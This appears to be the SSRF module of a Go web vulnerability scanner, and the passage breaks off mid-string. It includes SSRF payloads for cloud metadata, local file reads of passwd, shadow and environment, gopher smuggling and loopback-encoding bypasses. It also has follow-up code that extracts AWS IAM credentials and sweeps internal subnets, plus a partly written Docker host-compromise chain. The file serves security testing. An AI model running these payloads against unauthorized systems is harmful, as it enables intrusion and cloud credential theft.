// Package ssrf detects Server-Side Request Forgery vulnerabilities.
// Architecture:
//   1. Collect injectable parameters from all sources: URL query, form fields, JSON body.
//   2. For each parameter, test the full probe list — never stop after the first hit, since
//      multiple internal services (Redis, Docker, Vault...) may coexist on the same param.
//   3. When a probe confirms a high-value service, append an escalation finding describing
//      the concrete exploit chain (Docker RCE, Jenkins Groovy, Redis cron injection, etc.).
//   4. When AWS IMDS is confirmed, immediately follow up to extract IAM role credentials.
//   5. When any localhost-class SSRF is confirmed, sweep private IP subnets to discover
//      additional internal services reachable through the vulnerable parameter.
package ssrf

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

// paramSource distinguishes how the injectable parameter was found.
type paramSource int

const (
	sourceQuery paramSource = iota // URL query string
	sourceForm                     // HTML form field
	sourceJSON                     // JSON API body parameter
)

// ssrfParam is a single injectable parameter regardless of source.
type ssrfParam struct {
	name      string
	value     string
	source    paramSource
	pageURL   string
	form      *crawler.Form
	jsonParam *crawler.JSONParam
}

// probe is one SSRF test target with expected response markers and an optional
// escalation function that generates a follow-up finding describing the exploit chain.
type probe struct {
	url        string
	markers    []string
	detail     string
	escalateFn func(probeURL, fromURL, paramName string) *modules.Finding
}

// ============================================================
// Probe list
// ============================================================

var ssrfProbes = []probe{
	// --- Cloud metadata: AWS ---
	{
		url:        "http://169.254.169.254/latest/meta-data/",
		markers:    []string{"ami-id", "instance-id", "local-ipv4"},
		detail:     "AWS EC2 IMDS",
		escalateFn: chainAWSIMDS,
	},
	{
		url:     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		markers: []string{"AccessKeyId", "SecretAccessKey"},
		detail:  "AWS IAM credentials via IMDS",
	},
	{
		url:     "http://[::ffff:169.254.169.254]/latest/meta-data/",
		markers: []string{"ami-id", "instance-id", "local-ipv4"},
		detail:  "AWS IMDS via IPv4-mapped IPv6 bypass",
	},
	{
		url:     "http://169.254.169.254",
		markers: []string{"ami-id", "instance-id", "computeMetadata"},
		detail:  "Cloud metadata (bare IP)",
	},
	{
		url:     "http://[fd00:ec2::254]/latest/meta-data/",
		markers: []string{"ami-id", "instance-id"},
		detail:  "AWS IMDSv2 IPv6",
	},
	{
		url:     "http://169.254.170.2/v2/metadata",
		markers: []string{"Cluster", "TaskARN", "Family"},
		detail:  "AWS ECS task metadata v2",
	},
	{
		url:     "http://169.254.170.2/v4/metadata",
		markers: []string{"Cluster", "TaskARN", "Containers"},
		detail:  "AWS ECS task metadata v4",
	},

	// --- Cloud metadata: GCP ---
	{
		url:     "http://metadata.google.internal/computeMetadata/v1/",
		markers: []string{"instance", "project"},
		detail:  "GCP metadata",
	},

	// --- Cloud metadata: Azure ---
	{
		url:     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		markers: []string{"compute", "subscriptionId"},
		detail:  "Azure IMDS",
	},

	// --- Cloud metadata: DigitalOcean ---
	{
		url:     "http://169.254.169.254/metadata/v1/",
		markers: []string{"interfaces", "floating_ip"},
		detail:  "DigitalOcean metadata",
	},

	// --- Cloud metadata: Oracle Cloud ---
	{
		url:     "http://169.254.169.254/opc/v1/instance/",
		markers: []string{"regionInfo", "timeCreated", "tenantId", "compartmentId"},
		detail:  "Oracle Cloud Infrastructure IMDS",
	},

	// --- Cloud metadata: Alibaba Cloud ---
	{
		url:     "http://100.100.100.200/latest/meta-data/",
		markers: []string{"instance-id", "dns-conf", "private-ipv4", "owner-account-id"},
		detail:  "Alibaba Cloud ECS metadata (100.100.100.200)",
	},

	// --- Cloud metadata: Tencent Cloud ---
	{
		url:     "http://metadata.tencentyun.com/latest/meta-data/",
		markers: []string{"instance-id", "local-ipv4", "public-ipv4"},
		detail:  "Tencent Cloud CVM metadata",
	},

	// --- Cloud metadata: Huawei / OpenStack ---
	{
		url:     "http://169.254.169.254/openstack/latest/meta_data.json",
		markers: []string{"uuid", "availability_zone", "project_id"},
		detail:  "Huawei Cloud / OpenStack Nova IMDS",
	},

	// --- File read ---
	{
		url:     "file:///etc/passwd",
		markers: []string{"root:", "daemon:"},
		detail:  "file:// scheme (unix passwd)",
	},
	{
		url:     "file:///c:/windows/win.ini",
		markers: []string{"[fonts]", "[extensions]"},
		detail:  "file:// scheme (windows)",
	},
	{
		url:     "file:///etc/shadow",
		markers: []string{"root:$", "daemon:"},
		detail:  "file:///etc/shadow — password hashes",
	},
	{
		url:     "file:///proc/self/environ",
		markers: []string{"PATH=", "HOME=", "USER="},
		detail:  "file:///proc/self/environ — process environment",
	},

	// --- Docker daemon API (unauthenticated, port 2375) ---
	{
		url:        "http://127.0.0.1:2375/info",
		markers:    []string{"ServerVersion", "Containers", "DockerRootDir", "NCPU"},
		detail:     "Docker daemon API unauthenticated (127.0.0.1:2375)",
		escalateFn: chainDockerDaemon,
	},
	{
		url:     "http://127.0.0.1:2375/containers/json",
		markers: []string{"\"Id\"", "\"Names\"", "\"Image\"", "\"State\""},
		detail:  "Docker daemon container list (127.0.0.1:2375)",
	},
	{
		url:     "http://127.0.0.1:2375/images/json",
		markers: []string{"RepoTags", "\"Created\""},
		detail:  "Docker daemon image list (127.0.0.1:2375)",
	},
	{
		url:     "http://127.0.0.1:2376/info",
		markers: []string{"ServerVersion", "Containers", "DockerRootDir"},
		detail:  "Docker daemon TLS port (127.0.0.1:2376)",
	},

	// --- etcd ---
	{
		url:     "http://127.0.0.1:2379/v2/members",
		markers: []string{"members", "clientURLs", "\"name\""},
		detail:  "etcd v2 cluster members (127.0.0.1:2379)",
	},
	{
		url:     "http://127.0.0.1:2379/metrics",
		markers: []string{"etcd_server_version", "grpc_server_started", "go_goroutines"},
		detail:  "etcd Prometheus metrics (127.0.0.1:2379)",
	},

	// --- HashiCorp Vault ---
	{
		url:        "http://127.0.0.1:8200/v1/sys/health",
		markers:    []string{"initialized", "sealed", "standby"},
		detail:     "HashiCorp Vault health (127.0.0.1:8200)",
		escalateFn: chainVault,
	},
	{
		url:     "http://127.0.0.1:8200/v1/sys/mounts",
		markers: []string{"secret/", "cubbyhole/", "sys/"},
		detail:  "HashiCorp Vault mounts — secrets engines",
	},

	// --- Jenkins CI/CD ---
	{
		url:        "http://127.0.0.1:8080/api/json",
		markers:    []string{"jobs", "views", "useCrumbs", "primaryView"},
		detail:     "Jenkins API (127.0.0.1:8080)",
		escalateFn: chainJenkins,
	},
	{
		url:     "http://127.0.0.1:8080/script",
		markers: []string{"Groovy", "Script Console", "hudson"},
		detail:  "Jenkins Script Console — direct Groovy RCE",
	},
	{
		url:     "http://127.0.0.1:8080/credentials/store/system/domain/_/",
		markers: []string{"credentials", "store"},
		detail:  "Jenkins credentials store (127.0.0.1:8080)",
	},

	// --- Internal services ---
	{
		url:        "http://127.0.0.1:22/",
		markers:    []string{"ssh-", "openssh"},
		detail:     "localhost SSH",
	},
	{
		url:        "http://127.0.0.1:6379/",
		markers:    []string{"-ERR", "+OK", "*1", "$6"},
		detail:     "localhost Redis (HTTP banner)",
		escalateFn: chainRedisRCE,
	},
	{
		url:     "http://127.0.0.1:27017/",
		markers: []string{"mongodb", "you are trying to access mongodb"},
		detail:  "localhost MongoDB",
	},
	{
		url:     "http://127.0.0.1:9200/",
		markers: []string{"elasticsearch", "cluster_name"},
		detail:  "localhost Elasticsearch",
	},
	{
		url:     "http://127.0.0.1:8500/v1/status/leader",
		markers: []string{"Consul", "raft"},
		detail:  "localhost Consul",
	},
	{
		url:     "http://127.0.0.1:9090/api/v1/label/__name__/values",
		markers: []string{"\"status\"", "\"data\"", "\"success\""},
		detail:  "Prometheus (127.0.0.1:9090)",
	},
	{
		url:     "http://127.0.0.1:9090/api/v1/targets",
		markers: []string{"activeTargets", "scrapeUrl", "health"},
		detail:  "Prometheus targets",
	},
	{
		url:     "http://127.0.0.1:3000/api/org",
		markers: []string{"orgName", "\"id\"", "\"name\""},
		detail:  "Grafana org API (127.0.0.1:3000)",
	},
	{
		url:     "http://127.0.0.1:3000/api/datasources",
		markers: []string{"\"type\"", "\"url\"", "\"orgId\""},
		detail:  "Grafana datasources — may contain DB credentials",
	},
	{
		url:     "http://127.0.0.1:5984/",
		markers: []string{"couchdb", "\"Welcome\"", "\"version\""},
		detail:  "CouchDB (127.0.0.1:5984)",
	},
	{
		url:     "http://127.0.0.1:5984/_all_dbs",
		markers: []string{"_users", "_replicator"},
		detail:  "CouchDB database list",
	},
	{
		url:     "http://127.0.0.1:15672/api/overview",
		markers: []string{"rabbitmq_version", "cluster_name", "management_version"},
		detail:  "RabbitMQ Management (127.0.0.1:15672)",
	},
	{
		url:     "http://127.0.0.1:15672/api/users",
		markers: []string{"\"name\"", "\"password_hash\"", "administrator"},
		detail:  "RabbitMQ user list — password hashes",
	},
	{
		url:     "http://127.0.0.1:5601/api/status",
		markers: []string{"\"version\"", "\"name\"", "kibana"},
		detail:  "Kibana (127.0.0.1:5601)",
	},
	{
		url:     "http://127.0.0.1:8086/query?q=SHOW+DATABASES",
		markers: []string{"results", "\"series\"", "_internal"},
		detail:  "InfluxDB (127.0.0.1:8086)",
	},
	{
		url:     "http://127.0.0.1:5555/api/workers",
		markers: []string{"celery@", "\"active\"", "\"stats\""},
		detail:  "Celery Flower (127.0.0.1:5555)",
	},
	{
		url:     "http://127.0.0.1:4040/api/v1/applications",
		markers: []string{"sparkVersion", "\"attempts\""},
		detail:  "Apache Spark UI (127.0.0.1:4040)",
	},
	{
		url:     "http://127.0.0.1:50070/jmx?qry=Hadoop:service=NameNode,name=NameNodeStatus",
		markers: []string{"beans", "Hadoop", "NameNode"},
		detail:  "Hadoop NameNode (127.0.0.1:50070)",
	},
	{
		url:     "http://127.0.0.1:9000/",
		markers: []string{"AccessDenied", "NoSuchBucket", "InvalidBucketName", "minio"},
		detail:  "MinIO S3 API (127.0.0.1:9000)",
	},

	// --- Internal web servers ---
	{
		url:     "http://127.0.0.1/",
		markers: []string{"apache", "nginx", "iis", "welcome", "it works"},
		detail:  "internal web server (127.0.0.1)",
	},
	{
		url:     "http://127.0.0.1:8080/",
		markers: []string{"apache", "nginx", "tomcat", "jetty", "it works", "welcome", "jenkins"},
		detail:  "internal web service port 8080",
	},
	{
		url:     "http://127.0.0.1:8000/",
		markers: []string{"django", "python", "gunicorn", "welcome", "it works"},
		detail:  "internal web service port 8000",
	},
	{
		url:     "http://127.0.0.1:5000/",
		markers: []string{"flask", "werkzeug", "python", "welcome"},
		detail:  "internal web service port 5000 (Flask/Python)",
	},
	{
		url:     "http://127.0.0.1:3000/",
		markers: []string{"grafana", "express", "react", "node", "welcome"},
		detail:  "internal web service port 3000",
	},
	{
		url:     "http://127.0.0.1/admin",
		markers: []string{"admin", "dashboard", "logout", "administrator"},
		detail:  "internal admin panel (127.0.0.1/admin)",
	},
	{
		url:     "http://127.0.0.1:8080/admin",
		markers: []string{"admin", "dashboard", "logout", "jenkins"},
		detail:  "internal admin at port 8080",
	},

	// --- Kubernetes ---
	{
		url:     "https://10.96.0.1:443/api/v1/namespaces",
		markers: []string{"\"kind\"", "\"namespace\"", "Unauthorized"},
		detail:  "Kubernetes API server (10.96.0.1:443)",
	},
	{
		url:     "https://kubernetes.default.svc/api/v1/namespaces",
		markers: []string{"\"kind\"", "Namespace", "Unauthorized"},
		detail:  "Kubernetes default.svc API",
	},
	{
		url:     "https://kubernetes.default/api/v1/pods",
		markers: []string{"\"kind\"", "\"Pod\"", "Unauthorized"},
		detail:  "Kubernetes default API — pod list",
	},

	// --- Docker bridge / internal hosts ---
	{
		url:     "http://172.17.0.1/",
		markers: []string{"apache", "nginx", "docker", "it works"},
		detail:  "Docker bridge gateway (172.17.0.1)",
	},

	// --- IP encoding bypasses (resolve to 127.0.0.1) ---
	{
		url:     "http://0x7f000001/",
		markers: []string{"apache", "nginx", "iis", "it works", "welcome"},
		detail:  "127.0.0.1 hex-encoded (0x7f000001)",
	},
	{
		url:     "http://2130706433/",
		markers: []string{"apache", "nginx", "iis", "it works"},
		detail:  "127.0.0.1 decimal-encoded",
	},
	{
		url:     "http://0177.0.0.1/",
		markers: []string{"apache", "nginx", "iis", "it works"},
		detail:  "127.0.0.1 octal-encoded",
	},
	{
		url:     "http://127.1/",
		markers: []string{"apache", "nginx", "iis", "it works"},
		detail:  "127.1 abbreviated",
	},
	{
		url:     "http://[::1]/",
		markers: []string{"apache", "nginx", "iis", "it works"},
		detail:  "IPv6 loopback [::1]",
	},
	{
		url:     "http://127.0.0.1%09/",
		markers: []string{"apache", "nginx", "iis", "it works"},
		detail:  "127.0.0.1 with URL-encoded tab",
	},
	{
		url:     "http://localhost/",
		markers: []string{"apache", "nginx", "iis", "it works", "welcome"},
		detail:  "localhost hostname alias",
	},
	{
		url:     "http://0.0.0.0/",
		markers: []string{"apache", "nginx", "iis", "it works", "welcome"},
		detail:  "0.0.0.0 (loopback alias)",
	},

	// --- Gopher protocol smuggling ---
	// Redis: PING only (read-only, safe)
	{
		url:        "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A",
		markers:    []string{"+PONG", "+OK"},
		detail:     "gopher:// → Redis PING (127.0.0.1:6379)",
		escalateFn: chainRedisGopherRCE,
	},
	// Memcached: stats
	{
		url:     "gopher://127.0.0.1:11211/_%0D%0Astats%0D%0A",
		markers: []string{"STAT ", "END"},
		detail:  "gopher:// → Memcached (127.0.0.1:11211)",
	},
	// SMTP
	{
		url:     "gopher://127.0.0.1:25/_HELO%20localhost%0D%0A",
		markers: []string{"220 ", "250 "},
		detail:  "gopher:// → SMTP (127.0.0.1:25)",
	},
	// dict://
	{
		url:     "dict://127.0.0.1:6379/info",
		markers: []string{"redis_version", "connected_clients"},
		detail:  "dict:// → Redis INFO",
	},
}

// fetchErrorPatterns indicate the server attempted an outbound connection (blind SSRF).
var fetchErrorPatterns = []string{
	"connection refused",
	"no route to host",
	"failed to connect",
	"cannot connect",
	"network is unreachable",
	"request timed out",
	"could not resolve host",
	"name or service not known",
	"getaddrinfo",
	"socket error",
	"i/o timeout",
	"dial tcp",
	"connection reset by peer",
}

var urlParamNames = []string{
	"url", "uri", "link", "href", "src", "source", "dest", "destination",
	"target", "redirect", "redirect_url", "redirect_uri", "next", "return",
	"returnUrl", "callback", "image", "img", "load", "fetch", "request",
	"proxy", "remote", "endpoint", "api", "service", "host", "site",
	"page", "feed", "webhook", "file", "path", "open", "goto", "resource",
	"imageUrl", "imageurl", "document", "import", "export", "download",
	"baseUrl", "base_url", "baseuri", "returnTo", "return_to",
	"wsdl", "embed", "outbound", "forward_url", "forwardUrl",
	"server", "connect", "upload", "location", "domain",
	"continue", "asset", "attachment", "content_url", "icon",
}

// internalSubnetHosts are probed after any localhost SSRF is confirmed.
// Limited to high-value targets to keep scanning time reasonable.
var internalSubnetHosts = []struct{ ip, port string }{
	// Docker bridge
	{"172.17.0.1", "80"}, {"172.17.0.2", "80"}, {"172.17.0.2", "8080"},
	// Common private gateways
	{"10.0.0.1", "80"}, {"10.0.0.2", "80"}, {"10.0.0.2", "8080"},
	{"192.168.0.1", "80"}, {"192.168.1.1", "80"},
	// Kubernetes cluster IP range
	{"10.96.0.1", "443"}, {"10.100.0.1", "443"},
	// Typical container service IPs
	{"10.0.0.10", "80"}, {"10.0.0.10", "8080"},
	{"10.10.0.1", "80"}, {"10.10.0.2", "80"},
	// EC2 common internal IPs
	{"10.0.1.1", "80"}, {"10.0.1.2", "80"},
}

// ============================================================
// Module
// ============================================================

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "ssrf" }

// ============================================================
// Run — main orchestration
// ============================================================

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	params := m.collectAllParams(page)
	if len(params) == 0 {
		return nil, nil
	}

	var (
		mu sync.Mutex

		findings []modules.Finding
		// Track confirmed findings for escalation/follow-up decisions
		imdsConfirmed      bool
		imdsParam          *ssrfParam
		localhostConfirmed bool
		localhostParam     *ssrfParam
		// Avoid duplicate blind-SSRF findings per param
		blindSSRFReported = make(map[string]bool)
	)

	addFinding := func(f modules.Finding) {
		mu.Lock()
		findings = append(findings, f)
		mu.Unlock()
	}

	for i := range params {
		p := &params[i]
		if ctx.Err() != nil {
			break
		}

		for _, pr := range ssrfProbes {
			if ctx.Err() != nil {
				break
			}

			body, reqDump, err := m.inject(ctx, *p, pr.url)
			if err != nil {
				continue
			}
			bodyStr := string(body)
			bodyLow := strings.ToLower(bodyStr)
			resp3k := bodyStr
			if len(resp3k) > 3000 {
				resp3k = resp3k[:3000] + "\n[… truncated]"
			}

			// Check for confirmed SSRF (marker match)
			matched := false
			for _, marker := range pr.markers {
				if strings.Contains(bodyLow, strings.ToLower(marker)) {
					matched = true
					f := modules.Finding{
						Module:      "ssrf",
						Severity:    modules.Critical,
						URL:         paramURL(*p),
						Param:       p.name,
						Payload:     pr.url,
						Evidence:    fmt.Sprintf("Marker %q confirmed — server fetched %s", marker, pr.detail),
						Detail:      fmt.Sprintf("SSRF: parameter %q triggered server-side fetch of %s", p.name, pr.detail),
						CWE:         "CWE-918",
						CVSS:        8.6,
						CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
						Confidence:  modules.Confirmed,
						Remediation: "Validate and whitelist outbound URLs; block internal IP ranges and metadata endpoints; use an egress proxy with an explicit allow-list",
						Tags:        tagsForProbe(pr),
						Request:     reqDump,
						Response:    resp3k,
						Extracted:   resp3k,
					}
					addFinding(f)

					// Escalation chain
					if pr.escalateFn != nil {
						if ef := pr.escalateFn(pr.url, paramURL(*p), p.name); ef != nil {
							addFinding(*ef)
						}
					}

					// Track for follow-up phases
					if isIMDSURL(pr.url) {
						imdsConfirmed = true
						imdsParam = p
					}
					if isLocalhostURL(pr.url) {
						localhostConfirmed = true
						localhostParam = p
					}
					break
				}
			}
			if matched {
				continue // test remaining probes on this param — don't stop at first hit
			}

			// Blind SSRF: server tried to connect but returned a fetch error
			if !blindSSRFReported[paramKey(*p)] {
				for _, errPat := range fetchErrorPatterns {
					if strings.Contains(bodyLow, errPat) {
						addFinding(modules.Finding{
							Module:      "ssrf",
							Severity:    modules.Medium,
							URL:         paramURL(*p),
							Param:       p.name,
							Payload:     pr.url,
							Evidence:    fmt.Sprintf("Fetch error %q — server attempted outbound connection", errPat),
							Detail:      fmt.Sprintf("Blind SSRF: parameter %q caused server-side connection attempt to %s", p.name, pr.url),
							CWE:         "CWE-918",
							CVSS:        6.5,
							CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
							Confidence:  modules.Likely,
							Remediation: "Validate and whitelist outbound URLs; block internal IP ranges; use an egress proxy",
							Tags:        []string{"ssrf", "blind"},
							Request:     reqDump,
						})
						blindSSRFReported[paramKey(*p)] = true
						break
					}
				}
			}
		}
	}

	// --- Phase 2: AWS IAM credential extraction ---
	if imdsConfirmed && imdsParam != nil && ctx.Err() == nil {
		if cf := m.extractAWSCredentials(ctx, *imdsParam); cf != nil {
			addFinding(*cf)
		}
	}

	// --- Phase 3: Internal subnet discovery ---
	if localhostConfirmed && localhostParam != nil && ctx.Err() == nil {
		for _, f := range m.probeInternalNetwork(ctx, *localhostParam) {
			addFinding(f)
		}
	}

	return findings, nil
}

// ============================================================
// Parameter collection — all sources
// ============================================================

func (m *Module) collectAllParams(page crawler.Page) []ssrfParam {
	var params []ssrfParam
	seen := make(map[string]bool)

	add := func(p ssrfParam) {
		k := p.source_key()
		if !seen[k] {
			seen[k] = true
			params = append(params, p)
		}
	}

	// 1. URL query parameters
	u, err := url.Parse(page.URL)
	if err == nil {
		for k, vs := range u.Query() {
			val := ""
			if len(vs) > 0 {
				val = vs[0]
			}
			if isURLParam(k) || looksLikeURL(val) {
				add(ssrfParam{name: k, value: val, source: sourceQuery, pageURL: page.URL})
			}
		}
	}

	// 2. HTML form fields
	for i := range page.Forms {
		for _, f := range page.Forms[i].Fields {
			if f.Type == "hidden" || f.Type == "submit" || f.Type == "button" {
				continue
			}
			if isURLParam(f.Name) || looksLikeURL(f.Value) {
				add(ssrfParam{
					name: f.Name, value: f.Value, source: sourceForm,
					pageURL: page.URL, form: &page.Forms[i],
				})
			}
		}
	}

	// 3. JSON body parameters (extracted by crawler from API responses)
	// This covers modern REST APIs that pass URLs in JSON request bodies —
	// the most commonly missed SSRF surface.
	for i := range page.JSONParams {
		jp := &page.JSONParams[i]
		if isURLParam(jp.Key) || looksLikeURL(jp.Value) {
			add(ssrfParam{
				name: jp.Key, value: jp.Value, source: sourceJSON,
				pageURL: jp.Endpoint, jsonParam: jp,
			})
		}
	}

	return params
}

func (p ssrfParam) source_key() string {
	return fmt.Sprintf("%d|%s|%s", p.source, p.pageURL, p.name)
}

// ============================================================
// Injection dispatch
// ============================================================

func (m *Module) inject(ctx context.Context, p ssrfParam, value string) ([]byte, string, error) {
	req, err := m.buildRequest(ctx, p, value)
	if err != nil {
		return nil, "", err
	}
	resp, reqDump, err := m.client.DoCapture(req)
	if err != nil {
		return nil, reqDump, err
	}
	body, err := client.ReadBody(resp)
	return body, reqDump, err
}

func (m *Module) buildRequest(ctx context.Context, p ssrfParam, value string) (*http.Request, error) {
	switch p.source {
	case sourceJSON:
		return m.buildJSONRequest(ctx, p, value)
	case sourceForm:
		return m.buildFormRequest(ctx, p, value)
	default:
		return m.buildQueryRequest(ctx, p, value)
	}
}

func (m *Module) buildQueryRequest(ctx context.Context, p ssrfParam, value string) (*http.Request, error) {
	u, err := url.Parse(p.pageURL)
	if err != nil {
		return nil, err
	}
	q := u.Query()
	q.Set(p.name, value)
	u.RawQuery = q.Encode()
	return http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
}

func (m *Module) buildFormRequest(ctx context.Context, p ssrfParam, value string) (*http.Request, error) {
	if p.form == nil {
		return m.buildQueryRequest(ctx, p, value)
	}
	data := make(url.Values)
	for _, f := range p.form.Fields {
		if f.Name == p.name {
			data.Set(f.Name, value)
		} else if f.Value != "" {
			data.Set(f.Name, f.Value)
		} else {
			data.Set(f.Name, "test")
		}
	}
	method := strings.ToUpper(p.form.Method)
	if method == "" || method == "GET" {
		u, err := url.Parse(p.form.Action)
		if err != nil {
			return nil, err
		}
		u.RawQuery = data.Encode()
		return http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, p.form.Action, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return req, nil
}

// buildJSONRequest injects the SSRF probe URL into a JSON body parameter.
// It deep-clones the original request body and sets the target field to the
// probe URL, preserving all other fields so the server processes the request normally.
func (m *Module) buildJSONRequest(ctx context.Context, p ssrfParam, value string) (*http.Request, error) {
	if p.jsonParam == nil {
		return m.buildQueryRequest(ctx, p, value)
	}
	jp := p.jsonParam

	// Deep-clone via JSON round-trip to avoid mutating the shared FullBody map
	cloned, err := deepCloneJSON(jp.FullBody)
	if err != nil {
		return nil, err
	}
	setAtPath(cloned, jp.Path, value)

	jsonBytes, err := json.Marshal(cloned)
	if err != nil {
		return nil, err
	}

	method := jp.Method
	if method == "" {
		method = "POST"
	}
	req, err := http.NewRequestWithContext(ctx, method, jp.Endpoint, bytes.NewReader(jsonBytes))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	return req, nil
}

// ============================================================
// Post-confirm: AWS credential extraction
// ============================================================

// extractAWSCredentials follows up a confirmed IMDS SSRF by trying to list IAM roles
// and retrieve their temporary credentials. On success returns a Critical finding with
// the actual AccessKeyId and partial SecretAccessKey.
func (m *Module) extractAWSCredentials(ctx context.Context, p ssrfParam) *modules.Finding {
	// Step 1: list IAM role names attached to this instance
	roleBody, _, err := m.inject(ctx, p, "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
	if err != nil || len(roleBody) == 0 {
		return nil
	}
	roleName := strings.TrimSpace(string(roleBody))
	// Sanity-check: role name should look like an identifier, not HTML or XML
	if len(roleName) == 0 || len(roleName) > 128 || strings.ContainsAny(roleName, "<>{}\n") {
		return nil
	}
	// Multiple roles on one line → pick first
	if idx := strings.IndexAny(roleName, "\n\r"); idx > 0 {
		roleName = roleName[:idx]
	}

	// Step 2: retrieve credentials for that role
	credURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + url.PathEscape(roleName)
	credBody, reqDump, err := m.inject(ctx, p, credURL)
	if err != nil {
		return nil
	}
	credStr := string(credBody)
	if !strings.Contains(credStr, "AccessKeyId") {
		return nil
	}

	// Redact the SecretAccessKey from the evidence before including it in the finding
	evidence := redactSecret(credStr)

	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         paramURL(p),
		Param:       p.name,
		Payload:     credURL,
		Evidence:    fmt.Sprintf("AWS IAM credentials for role %q extracted via IMDS SSRF:\n%s", roleName, evidence),
		Detail:      "SSRF → AWS IAM credential theft: the server fetched the EC2 instance metadata service and returned temporary IAM credentials for the attached role. These credentials grant the same AWS permissions as the EC2 instance role and can be used immediately via the AWS CLI or SDK for lateral movement, data exfiltration, or privilege escalation within the AWS account.",
		CWE:         "CWE-918",
		CVSS:        10.0,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Confirmed,
		Remediation: "Enforce IMDSv2 (PUT-based token flow) on all EC2 instances; apply least-privilege IAM roles; block outbound access to 169.254.169.254 at the application layer",
		Tags:        []string{"ssrf", "cloud-metadata", "aws", "credential-theft", "lateral-movement"},
		Request:     reqDump,
		Extracted:   evidence,
	}
}

// ============================================================
// Post-confirm: internal network discovery
// ============================================================

// probeInternalNetwork sweeps private IP subnets via the confirmed SSRF parameter.
// It runs probes concurrently (capped at 6 workers) and returns findings for any
// responsive internal services.
func (m *Module) probeInternalNetwork(ctx context.Context, p ssrfParam) []modules.Finding {
	type result struct {
		ip, port string
		body     string
	}

	resCh := make(chan result, len(internalSubnetHosts))
	sem := make(chan struct{}, 6)
	var wg sync.WaitGroup

	for _, host := range internalSubnetHosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(ip, port string) {
			defer wg.Done()
			defer func() { <-sem }()
			if ctx.Err() != nil {
				return
			}
			scheme := "http"
			if port == "443" {
				scheme = "https"
			}
			probeURL := fmt.Sprintf("%s://%s:%s/", scheme, ip, port)
			body, _, err := m.inject(ctx, p, probeURL)
			if err != nil || len(body) == 0 {
				return
			}
			bodyLow := strings.ToLower(string(body))
			// Report if we get any recognisable web/service response
			for _, marker := range []string{
				"apache", "nginx", "iis", "tomcat", "it works", "welcome",
				"<!doctype", "<html", "grafana", "jenkins", "kibana",
				"swagger", "kubernetes", "unauthorized", "forbidden",
				"\"status\"", "\"version\"", "application/json",
			} {
				if strings.Contains(bodyLow, marker) {
					resCh <- result{ip: ip, port: port, body: truncate(string(body), 200)}
					return
				}
			}
		}(host.ip, host.port)
	}

	wg.Wait()
	close(resCh)

	var findings []modules.Finding
	for r := range resCh {
		findings = append(findings, modules.Finding{
			Module:      "ssrf",
			Severity:    modules.High,
			URL:         paramURL(p),
			Param:       p.name,
			Payload:     fmt.Sprintf("http://%s:%s/", r.ip, r.port),
			Evidence:    fmt.Sprintf("Internal host %s:%s responded via SSRF: %s", r.ip, r.port, r.body),
			Detail:      fmt.Sprintf("SSRF internal network discovery: parameter %q reached internal host %s:%s. This host may be a container, internal API, or infrastructure component not directly accessible from the internet.", p.name, r.ip, r.port),
			CWE:         "CWE-918",
			CVSS:        7.5,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
			Confidence:  modules.Confirmed,
			Remediation: "Block internal IP ranges at the application layer; use an egress proxy with an explicit allow-list; apply network-level segmentation",
			Tags:        []string{"ssrf", "internal-network", "lateral-movement"},
		})
	}
	return findings
}

// ============================================================
// Escalation chain generators
// ============================================================

func chainAWSIMDS(probeURL, fromURL, paramName string) *modules.Finding {
	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         fromURL,
		Param:       paramName,
		Payload:     probeURL,
		Evidence:    "AWS EC2 IMDS confirmed — attempting IAM credential extraction",
		Detail:      "SSRF → AWS credential theft chain: AWS EC2 Instance Metadata Service (IMDS) is reachable via this SSRF. Attack path: (1) GET /latest/meta-data/iam/security-credentials/ to list attached IAM roles; (2) GET /latest/meta-data/iam/security-credentials/{role} to obtain AccessKeyId, SecretAccessKey, and SessionToken; (3) use credentials for full AWS API access with the instance's IAM permissions (S3, EC2, IAM, Lambda, etc.).",
		CWE:         "CWE-918",
		CVSS:        10.0,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Confirmed,
		Remediation: "Enforce IMDSv2 on all EC2 instances (require-token = required); apply least-privilege IAM roles; block 169.254.169.254 outbound at the application firewall",
		Tags:        []string{"ssrf", "cloud-metadata", "aws", "credential-theft", "lateral-movement"},
	}
}

func chainDockerDaemon(probeURL, fromURL, paramName string) *modules.Finding {
	return &modules.Finding{
		Module:      "ssrf",
		Severity:    modules.Critical,
		URL:         fromURL,
		Param:       paramName,
		Payload:     probeURL,
		Evidence:    "Unauthenticated Docker daemon API at 127.0.0.1:2375 confirmed",
		Detail:      "SSRF → Docker daemon RCE chain: the Docker daemon REST API is accessible without authentication. Full host compromise is achievable in three steps:\n" +
			"  1. Create privileged container with host filesystem bind:\n" +
			`     POST /containers/create {"Image":"alpine","HostConfig":{"Binds":["/:/host"],"Privileged":true}}` + "\n" +
